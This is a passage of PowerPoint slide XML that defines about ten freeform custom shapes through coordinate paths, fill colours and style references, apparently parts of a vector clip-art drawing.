          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="654" name="CustomShape 270"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2706840" y="3446640"/>
            <a:ext cx="72360" cy="86760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="46" h="55">
                <a:moveTo>
                  <a:pt x="4" y="6"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="4" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="55"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="54"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="49"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="46"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="43"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="21"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="19"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="17" y="16"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="21" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="41" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="46" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="45" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="43" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="40" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="6"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="999999"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="655" name="CustomShape 271"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2604960" y="3511440"/>
            <a:ext cx="57960" cy="15120"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="37" h="10">
                <a:moveTo>
                  <a:pt x="0" y="7"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="7"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="656" name="CustomShape 272"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2604960" y="3471840"/>
            <a:ext cx="57960" cy="16920"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="37" h="11">
                <a:moveTo>
                  <a:pt x="0" y="7"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="32" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="37" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="36" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="34" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="33" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="22" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="15" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="13" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="7"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="657" name="CustomShape 273"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2660760" y="3454560"/>
            <a:ext cx="96120" cy="178560"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="61" h="113">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="110"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="113"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="98"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="105"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="99"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="96"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="29" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="9" y="83"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="8" y="80"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="76"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="59"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="48"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="1" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="20"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="001999"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="658" name="CustomShape 274"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2708280" y="3413160"/>
            <a:ext cx="124560" cy="23040"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="79" h="15">
                <a:moveTo>
                  <a:pt x="0" y="15"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="0" y="15"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="7" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="11" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="14" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="19" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="24" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="35" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="42" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="48" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="55" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="62" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="69" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="9"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="79" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="74" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="70" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="66" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="56" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="51" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="44" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="38" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="31" y="2"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="18" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="12" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="15"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="333333"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="659" name="CustomShape 275"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2637000" y="3637080"/>
            <a:ext cx="208800" cy="70560"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="132" h="45">
                <a:moveTo>
                  <a:pt x="55" y="44"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="56" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="59" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="61" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="63" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="65" y="39"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="68" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="71" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="73" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="80" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="82" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="84" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="24"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="6" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="90" y="25"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="90" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="89" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="87" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="86" y="30"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="31"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="83" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="80" y="33"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="70" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="65" y="41"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="62" y="42"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="57" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="55" y="44"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="660" name="CustomShape 276"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2592360" y="3656160"/>
            <a:ext cx="213480" cy="62640"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="135" h="40">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="132" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="135" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="5" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="661" name="CustomShape 277"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2629080" y="3646440"/>
            <a:ext cx="208800" cy="56520"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="132" h="36">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="130" y="36"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="35"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="4" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="662" name="CustomShape 278"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2612880" y="3651120"/>
            <a:ext cx="210240" cy="59760"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="133" h="38">
                <a:moveTo>
                  <a:pt x="0" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="130" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="133" y="38"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="3" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="0"/>
                </a:lnTo>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="000000"/>
          </a:solidFill>
          <a:ln w="9360">
            <a:noFill/>
          </a:ln>
        </p:spPr>
        <p:style>
          <a:lnRef idx="0"/>
          <a:fillRef idx="0"/>
          <a:effectRef idx="0"/>
          <a:fontRef idx="minor"/>
        </p:style>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="663" name="CustomShape 279"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3503520" y="3514680"/>
            <a:ext cx="394560" cy="331200"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="249" h="209">
                <a:moveTo>
                  <a:pt x="68" y="27"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="70" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="71" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="72" y="14"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="74" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="75" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="76" y="13"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="78" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="81" y="12"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="83" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="85" y="11"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="88" y="10"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="91" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="95" y="8"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="98" y="7"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="103" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="106" y="6"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="111" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="116" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="120" y="4"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="126" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="132" y="3"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="137" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="144" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="149" y="1"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="156" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="162" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="169" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="177" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="184" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="193" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="201" y="0"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="210" y="5"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="208" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="208" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="210" y="29"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="212" y="32"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="216" y="34"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="219" y="37"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="222" y="40"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="224" y="45"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="225" y="51"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="245" y="69"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="239" y="117"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="208" y="133"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="246" y="145"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="246" y="146"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="248" y="149"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="248" y="152"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="249" y="156"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="248" y="160"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="246" y="165"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="244" y="171"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="144" y="209"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="0" y="164"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="2" y="159"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="151"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="25" y="28"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="26" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="27" y="27"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="28" y="26"/>
                </a:lnTo>
                <a:lnTo>
                  <a:pt x="30" y="26"/>
                </a:lnTo>
